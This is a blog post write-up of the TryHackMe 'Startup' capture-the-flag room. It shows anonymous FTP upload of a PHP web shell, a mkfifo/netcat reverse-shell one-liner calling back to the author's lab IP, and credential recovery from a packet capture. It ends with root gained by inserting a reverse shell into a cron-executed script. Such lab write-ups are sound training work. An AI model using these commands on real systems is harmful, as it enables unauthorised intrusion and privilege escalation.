<!DOCTYPE html>
<html lang="en-us">
<head>
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <title>Tzero86@trojanwave/posts/startupspicehut_writeup/</title>
    
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <meta name="robots" content="all,follow">
    <meta name="googlebot" content="index,follow,snippet,archive">
    <link rel="stylesheet" href="https://tzero86bits.tk/hugo-theme-console/css/terminal-0.7.1.min.css">
    <link rel="stylesheet" href="https://tzero86bits.tk/hugo-theme-console/css/animate-3.7.2.min.css">
    <link rel="stylesheet" href="https://tzero86bits.tk/hugo-theme-console/css/console.css">
    
      <!--[if lt IE 9]>
          <script src="https://oss.maxcdn.com/html5shiv/3.7.2/html5shiv.min.js"></script>
          <script src="https://oss.maxcdn.com/respond/1.4.2/respond.min.js"></script>
      <![endif]-->
       <meta property="og:title" content="StartupSpiceHut_writeup" />
<meta property="og:description" content="" />
<meta property="og:type" content="article" />
<meta property="og:url" content="https://tzero86bits.tk/posts/startupspicehut_writeup/" /><meta property="article:published_time" content="2020-11-12T18:46:31-05:00" />



<meta name="twitter:title" content="StartupSpiceHut_writeup"/>
<meta name="twitter:description" content="We are Spice Hut, a new startup company that just made it big! We ask that you perform a thorough penetration test and try to own root. Good luck!"/>

</head>
<body class="terminal">
    <div class="container">
        <div class="terminal-nav">
          <header class="terminal-logo">
            <div class="logo terminal-prompt">
              
              
              <a href="https://tzero86bits.tk/" class="no-style site-name">Tzero86@trojanwave</a>:~# 
              <a href='https://tzero86bits.tk/posts'>posts</a>/<a href='https://tzero86bits.tk/posts/startupspicehut_writeup'>startupspicehut_writeup</a>/</div></header>
          <nav class="terminal-menu">
            <ul vocab="https://schema.org/" typeof="BreadcrumbList">
                
                <li><a href="https://tzero86bits.tk/about/" typeof="ListItem">about/</a></li>
                
                <li><a href="https://tzero86bits.tk/posts/" typeof="ListItem">posts/</a></li>
                
                <li><a href="https://tzero86bits.tk/photos/" typeof="ListItem">photos/</a></li>
                
            </ul>
          </nav>
        </div>
    </div>

    <div class="container animated zoomIn fast" >
        
<h1>StartupSpiceHut_writeup</h1>
Nov. 12, 2020


<br/><br/>
<img src="../img/spicehut_cover.gif" alt="Post Cover Gif animation";>
<br/><br/>
<h1 id="startup-spice-hut---thm-room">Startup (Spice Hut) - THM Room</h1>
<p>Welcome to another writeup, this time we&rsquo;ll be trying to hack a newly released room on TryHackMe called Startup created by <code>r1gormort1s</code>!</p>
<ul>
<li>Please visit This room on TryHackMe by <a href="https://tryhackme.com/room/startup">clicking this link</a>.</li>
<li><strong>PLEASE NOTE:</strong> Passwords, flag values, or any kind of answers to the room questions were intentionally masked as required by THM writeups rules.</li>
</ul>
<h2 id="getting-initial-access">Getting initial access</h2>
<p>Let&rsquo;s kick off things by running some scans, this time I&rsquo;ll be trying out <code>RustRecon</code> tool. If you don&rsquo;t have that already, check it out the repo <a href="https://github.com/RustScan/RustScan">here</a>.</p>
<p><img src="https://i.imgur.com/fRHwoDi.png" alt=""></p>
<p>This is a very fast tool, and scans are performed(usually) in a matter of seconds.</p>
<p>The results show that we have 3 ports open <code>21, 22 and 80</code>.  On port <code>21</code> it seems that anonymous access is enabled so let&rsquo;s take a look at that:</p>
<h3 id="ftp">FTP</h3>
<p>We connect to the FTP anonymously and see what&rsquo;s there for us:</p>
<p><img src="https://i.imgur.com/hpfoiXh.png" alt=""></p>
<p>There is a <code>notice.txt</code> If we look at that file we get the following:
<img src="https://i.imgur.com/16BJuph.png" alt=""></p>
<p>We get a possible username of <code>Maya</code> and a mention that someone if spamming with memes. Let&rsquo;see if there is anything else there:</p>
<p><img src="https://i.imgur.com/enHAEuc.png" alt=""></p>
<p>There is also a log file, that just contains the word <code>test</code> and an empty <code>ftp</code> directory.</p>
<p>Let&rsquo;s move on.</p>
<h3 id="gobuster">Gobuster</h3>
<p>Let&rsquo;s run a <code>gobuster</code> and see if it find anything for us:</p>
<p><img src="https://i.imgur.com/hBqOgUc.png" alt=""></p>
<p>Right away gobuster returns a <code>/files</code> directory. Let&rsquo;s check that out in the browser:</p>
<p><img src="https://i.imgur.com/eYCLGb6.png" alt=""></p>
<p>So we can access the FTP share through that route. Let&rsquo;s see if by any chance the anonymous user can actually upload files there. If that works we could potentially try to upload a file that get us the initial access to the server. Possibly a phpbash file.</p>
<p>Going back to the results returned by <code>Rustscan</code> we see there is a mention of that:</p>
<p><img src="https://i.imgur.com/tTseohx.png" alt=""></p>
<p>So let&rsquo;s figure out how we can exploit this.</p>
<p>If we connect back to the FTP and try to upload the file (I&rsquo;m trying a phpbash.php) we see that we don&rsquo;t have permissions at the root of the share. However, if we change directory into that empty <code>ftp</code> folder we found earlier, we are able to upload our file:</p>
<p><img src="https://i.imgur.com/YAFGphe.png" alt=""></p>
<blockquote>
<p>NOTE: If you look at the initial transfer, we didn&rsquo;t get back any file transfer size. Turns out I was sending a bad file first it was a corrupted php file. In the second attempt after getting a fresh copy of phpbash it did work fine. Download phpbash <a href="https://raw.githubusercontent.com/Arrexel/phpbash/master/phpbash.php">here</a></p>
</blockquote>
<p>Let&rsquo;s see if we can access that file from the <code>/files</code> route in our browser:</p>
<p><img src="https://i.imgur.com/l13lmSB.png" alt=""></p>
<p>Well the file is there, let&rsquo;s see if it can actually run:</p>
<p><img src="https://i.imgur.com/yFkDcOp.png" alt=""></p>
<p>It works! Let&rsquo;s see if we can get that spicy soup recipe now.</p>
<h2 id="searching-for-the-holy-soup">Searching for the holy soup</h2>
<p>If we try to browse around with our semi-interactive shell we notice we can&rsquo;t explore beyond the <code>/var/www</code> folder:</p>
<p><img src="https://i.imgur.com/9vrhTKf.png" alt=""></p>
<p>So we need to figure out how to escape this restricted access we have.</p>
<h3 id="stabilizing-our-shell-a-bit">Stabilizing our shell a bit</h3>
<p>Before we do that let&rsquo;s fire up a reverse shell to our machine and try to stabilize the shell so we can work more comfortable.</p>
<p>To do that I first run a <code>nc -nlvp 2112</code> (our favorite album and port number :laughing:) then we run the following command in our phpbash: <code>rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc 10.13.0.34 2112 &gt;/tmp/f</code></p>
<p>With that we have a reverse shell, let&rsquo;s try to stabilize it now by running this python line:
<code>python -c 'import pty; pty.spawn(&quot;/bin/bash&quot;)'</code> and then <code>export TERM=xterm</code></p>
<p>That&rsquo;s it, now we have a somewhat better shell to explore around.</p>
<h3 id="running-linpeassh">Running linPEAS.sh</h3>
<p>Let&rsquo;s see if linpeas can help us a bit here. In a folder where you have ready <code>linpeas.sh</code> let&rsquo;s fire up a local HTTP server with python by running: <code>sudo python3 -m http.server 80</code>.
Now let&rsquo;s try to upload that file to the target machine:</p>
<p><img src="https://i.imgur.com/eYO8fan.png" alt=""></p>
<blockquote>
<p>NOTE: Remember we only have write permissions inside <code>/var/www/html/files/ftp/</code> if you try to upload anywhere else you&rsquo;ll get a nice <code>permission denied</code>.</p>
</blockquote>
<p>Ok that works, now let&rsquo;s make sure we make that file executable by running <code>chmod +x linpeas.sh</code> and then we execute it <code>./linpeash.sh</code>:</p>
<p>Well that' took a while to run and&hellip; it didn&rsquo;t found anything immediately exploitable for us (unless you are not a noob like me and noticed something good there :joy: ). However, it seems to have found an username of <code>vagrant</code> and some unexpected folders named <code>incidents</code>, <code>data</code> and <code>vagrant</code>. Another possible interesting piece of info is that we have <code>/usr/bin/gettext.sh</code> inside the <code>PATH</code> variable.</p>
<h3 id="incidents">Incidents</h3>
<p>If we list the files inside the <code>/incidents</code> we see there is an interesting file there:</p>
<p><img src="https://i.imgur.com/BYuiCuo.png" alt=""></p>
<p>If you know this file type, you&rsquo;ll probably know already that we&rsquo;ll have to tinker around with <code>Wireshark</code> or a similar program next. So I&rsquo;ve already copied that folder to the writable <code>ftp</code> folder so we can access it easily and download a copy into our kali box.</p>
<p><img src="https://i.imgur.com/OQVaMYl.png" alt=""></p>
<blockquote>
<p><em>pcapng</em> file is a standard format for storing captured data. PCAPNG files normally contain several blocks of data. These blocks of data contain different types of information that are useful in. capturing and analyzing network data, such as connection traffic.The blocks may consist of a section header block, interface.</p>
</blockquote>
<h3 id="wiresharking-for-the-win">Wiresharking for the win</h3>
<p>Let&rsquo;s open Wireshark with that file and see what we can find. If we start looking at the events captured in the packet, we can see there is an upload of a <code>shell.php</code>. Let&rsquo;s follow the trail of that, after inspecting for a while we get to this part where we clearly see the user used python to stabilize his shell and then proceeded to list directories. We also see there is a <code>recipe.txt</code>, a username mentioned and even a password and the contents of the <code>/etc/passwd</code> file.</p>
<p><img src="https://i.imgur.com/Eu9pCDk.png" alt=""></p>
<p>If you were able to follow up you&rsquo;ll have a set of credentials for the user <code>lennie</code> that we can use to connect to the target machine now.</p>
<h3 id="getting-the-user-flag">Getting the user flag</h3>
<p>Let&rsquo;s see if we can switch users now, by doing <code>su {username_found}</code> and then entering the password that we got from inspecting that pcapng file.</p>
<p><img src="https://i.imgur.com/orpgfUl.png" alt=""></p>
<p>Ok so we were able to switch users and retrieve the user flag. But we still need to find that recipe. Let&rsquo;s see if we can do that next. If we navigate to the root of the directory (As we saw the user did on the pcapng file) we know there should be a <code>recipe.txt</code> file there. If we see its content we finally get the recipe.</p>
<p><img src="https://i.imgur.com/RNabNcU.png" alt=""></p>
<h2 id="getting-root-and-the-last-flag">Getting root and the last flag</h2>
<p>Now we need to see how we can get root, let&rsquo;s run a <code>sudo -l</code> and see if this user can access anything as sudo. I&rsquo;ll spare you the test, this user can&rsquo;t run sudo on this server.</p>
<p>Let&rsquo;s re-run linpeas and see if we missed something. When we look at linpeas results carefully, we see some interesting things mentioned:</p>
<p><img src="https://i.imgur.com/cO8G57Q.png" alt=""></p>
<p>We have an <code>/etc/print.sh</code> File, but there are some other things as well:</p>
<p><img src="https://i.imgur.com/wEYyGHw.png" alt=""></p>
<p>That file has been recently modified and could point us to something interesting. We also see there are some <code>interesting files</code> listed which gives us a few others possible ways of gaining root:</p>
<p><img src="https://i.imgur.com/VeCbcrD.png" alt=""></p>
<p>If we take a look at the files, starting with <code>startup_list.txt</code></p>
<p><img src="https://i.imgur.com/4bnTAxO.png" alt=""></p>
<p>If we check the file mentioned, it&rsquo;s the same one found by linpeas. All 3 files are somewhat connected. However, the one most interesting is <code>print.sh</code> if we can alter that file (that runs with elevated privileges) we can just add a connection to our kali box and if it works, we&rsquo;ll get root. Let&rsquo;s try that.</p>
<p>Run <code>nano /etc/print.sh</code> (Reconnect through ssh with lennie&rsquo;s credentials first, otherwise our &lsquo;stabilized&rsquo; terminal will just break when we open nano) and let&rsquo;s add a reverse shell back to our box (remember to start a listener like we did before).</p>
<p>Let&rsquo;s try to get a reverse shell using bash this time:</p>
<p><img src="https://i.imgur.com/NVNGSPE.png" alt=""></p>
<p>Now let&rsquo;s save the file (CTRL+X then Y and finally ENTER) and see if it works when executed. At this point it is important to make something clear, if we try to run that script directly with our current user, we&rsquo;ll just get another session logged in as lennie. If you noticed before when I listed the interesting files I mentioned that all 3 where connected.</p>
<p>Planner.sh -&gt; lists startup_list.txt -&gt; print.sh</p>
<p>But if we thing about it, it&rsquo;s quite possible that planner.sh is getting executed by a cronjob every X minutes. Let&rsquo;s see if we get a connection if we wait let&rsquo;s say, five minutes. If we don&rsquo;t, we&rsquo;ll have to find a way to see if there any jobs running that end up running <code>planner.sh</code>.</p>
<p>We were right, after just a minute or two we got back a connection as root!</p>
<p><img src="https://i.imgur.com/C99cCHo.png" alt=""></p>
<p>Now let&rsquo;s get that root flag and go make some dinner, I&rsquo;m starving :laughing:</p>
<p><img src="https://i.imgur.com/e9F4bVm.png" alt=""></p>
<p>That&rsquo;s it for this room, I hope you enjoy it as much as I did. Props to <code>r1gormort1s</code> for creating it!</p>
<p>Happy hacking!</p>
<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.min.css">
<br>
<div class="container center" style="margin:10px !important;  text-align: center!important">
    <div class="center">
        <script src="https://tryhackme.com/badge/71634"></script>
    </div>
    <div class="center">
        <a href="https://twitter.com/Tzero86" target="_blank" class="fa fa-twitter" style="text-decoration: none !important;  font-size: 30px; padding: 5px"></a>
        <a href="https://github.com/Tzero86" target="_blank" class="fa fa-github" style="text-decoration: none !important;  font-size: 30px; padding: 5px"></a> 
        <a href="https://www.linkedin.com/in/ermedina86/" target="_blank" class="fa fa-linkedin" style="text-decoration: none !important;  font-size: 30px; padding: 5px"></a> 
        <br> 
    </div>
</div>



        <div class="footer">
    Made with <a href="https://gohugo.io/">Hugo</a> with
    <a href="https://github.com/mrmierzejewski/hugo-theme-console/">Console Theme</a>. 
</div>

    </div>
  </body>
</html>
